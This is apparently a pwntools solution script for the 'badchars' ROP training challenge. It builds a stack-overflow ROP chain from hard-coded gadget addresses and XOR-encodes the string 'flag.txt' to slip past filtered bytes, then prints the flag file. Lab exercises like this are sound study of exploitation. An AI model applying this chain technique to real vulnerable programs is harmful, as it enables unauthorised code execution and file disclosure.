#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'badchars')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
pop_r12_r13_r14_r15 = p64(0x40069c) #pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
mov_r13_r12 = p64(0x400634) #mov qword ptr [r13], r12 ; ret

pop_r14_r15 = p64(0x4006a0) # pop r14 ; pop r15 ; ret
read_write_memory = 0x601040
another_write_read_memory = p64(0x601038)
return_gadget = p64(0x4004ee) #ret
xor_gadget = p64(0x400628)  #xor byte ptr [r15], r14b ; ret
rdi_pop = p64(0x4006a3) # pop rdi ; ret

print_function = p64(0x400510)
base_line = b'0000000'
t = b't'
zero = b'0'
flag = b'flag.txt'
line_xor_flag = b'V\QWZDHD'
line_test = [b'0',b't']
payload = b'A' * 32 + p64(0) + return_gadget + pop_r12_r13_r14_r15 + line_xor_flag + p64(read_write_memory) + p64(1) + p64(1) + mov_r13_r12

for i in range(8):
    if i == 4:
         payload += pop_r14_r15 + t + base_line + p64(read_write_memory + i)  + xor_gadget
    else:
        payload += pop_r14_r15 + zero + base_line  + p64(read_write_memory + i)  + xor_gadget

payload += rdi_pop + p64(read_write_memory) + print_function



io.sendlineafter('> ', payload)

io.interactive()

